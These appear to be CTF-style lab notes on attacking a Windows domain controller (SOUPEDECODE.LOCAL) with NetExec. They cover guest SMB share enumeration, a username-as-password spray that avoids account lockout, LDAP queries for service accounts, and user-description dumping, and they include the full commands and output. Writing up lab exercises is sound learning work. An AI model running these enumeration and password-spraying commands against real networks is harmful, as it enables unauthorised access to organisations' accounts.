# We now have a ton of users.
1. I at first tried to query over LDAPS, which is LDAP but over SSL aka encrypted, I failed in doing so because it's complaining about the binding.
2. When you observe the SMB shares we don't have anything over it `nxc smb DC01 -u guest -p '' --shares`

# Test for password resuage.
1. Why do it this way? Any half decent environment running windows has a lockout policy, if you hit a account with multiple login requests you are gonna lock the user out and they won't be happy.
2. This misconfiguration is a real world one, sometimes a account will have the password as the username.
```sh
nxc smb DC01 -u out.txt -p out.txt --no-bruteforce --continue-on-success
SMB         10.201.64.83    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
<SNIP> 
```

# He is our only valid user for now, can he access ldap?
We have searched and he is able to.

# Let's play
I've noticed file_svc has a use to us possibly I may have missed or not, but I see a @domain.com there and with the rest I don't.
nxc ldap DC01 -u ybob317 -p 'ybob317' --query "(servicePrincipalName=*)" ""

```sh
nxc ldap DC01 -u ybob317 -p 'ybob317' --query "(servicePrincipalName=*)" ""
SMB         10.201.64.83    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.201.64.83    389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
LDAP        10.201.64.83    389    DC01             [+] Response for object: CN=DC01,OU=Domain Controllers,DC=SOUPEDECODE,DC=LOCAL                            
LDAP        10.201.64.83    389    DC01             [+] Response for object: CN=file_svc .ora,CN=Users,DC=SOUPEDECODE,DC=LOCAL
LDAP        10.201.64.83    389    DC01             objectClass:         top person organizationalPerson user                                                                                                   
LDAP        10.201.64.83    389    DC01             cn:                  file_svc .ora
LDAP        10.201.64.83    389    DC01             sn:                  .ora
LDAP        10.201.64.83    389    DC01             l:                   Rivertown
LDAP        10.201.64.83    389    DC01             st:                  TX
LDAP        10.201.64.83    389    DC01             title:               Manager
LDAP        10.201.64.83    389    DC01             description:         Gardening aficionado with a green thumb                                                                                                
LDAP        10.201.64.83    389    DC01             postalCode:          59087
LDAP        10.201.64.83    389    DC01             telephoneNumber:     934-3911
LDAP        10.201.64.83    389    DC01             givenName:           file_svc
LDAP        10.201.64.83    389    DC01             initials:            NN
LDAP        10.201.64.83    389    DC01             distinguishedName:   CN=file_svc .ora,CN=Users,DC=SOUPEDECODE,DC=LOCAL                                                                                      
LDAP        10.201.64.83    389    DC01             instanceType:        4
LDAP        10.201.64.83    389    DC01             whenCreated:         20240615200436.0Z
LDAP        10.201.64.83    389    DC01             whenChanged:         20240704224830.0Z
LDAP        10.201.64.83    389    DC01             displayName:         file_svc .ora
LDAP        10.201.64.83    389    DC01             uSNCreated:          16608
LDAP        10.201.64.83    389    DC01             uSNChanged:          155732
LDAP        10.201.64.83    389    DC01             department:          IT
LDAP        10.201.64.83    389    DC01             company:             CompanyC
LDAP        10.201.64.83    389    DC01             streetAddress:       456 Oak St
LDAP        10.201.64.83    389    DC01             name:                file_svc .ora
LDAP        10.201.64.83    389    DC01             objectGUID:          0xae18cb28b840f341863f834e00a96320                                                                                                     
LDAP        10.201.64.83    389    DC01             userAccountControl:  66048
LDAP        10.201.64.83    389    DC01             badPwdCount:         1
LDAP        10.201.64.83    389    DC01             codePage:            0
LDAP        10.201.64.83    389    DC01             countryCode:         0
LDAP        10.201.64.83    389    DC01             badPasswordTime:     133996489866187608
LDAP        10.201.64.83    389    DC01             lastLogoff:          0
LDAP        10.201.64.83    389    DC01             lastLogon:           0
LDAP        10.201.64.83    389    DC01             logonHours:          0xffffffffffffffffffffffffffffffffffffffffff                                                                                           
LDAP        10.201.64.83    389    DC01             pwdLastSet:          133631191437260855
LDAP        10.201.64.83    389    DC01             primaryGroupID:      513
LDAP        10.201.64.83    389    DC01             objectSid:           0x0105000000000005150000007ab409b27c94c902149655956d040000                                                                             
LDAP        10.201.64.83    389    DC01             accountExpires:      0
LDAP        10.201.64.83    389    DC01             logonCount:          0
LDAP        10.201.64.83    389    DC01             sAMAccountName:      file_svc
LDAP        10.201.64.83    389    DC01             sAMAccountType:      805306368
LDAP        10.201.64.83    389    DC01             userPrincipalName:   file_svc@soupedecode.local
```


# Pull user descriptions, just a rabbit hole. But the command is left here in case you want it.
nxc ldap DC01 -u ybob317 -p ybob317 -M get-desc-users
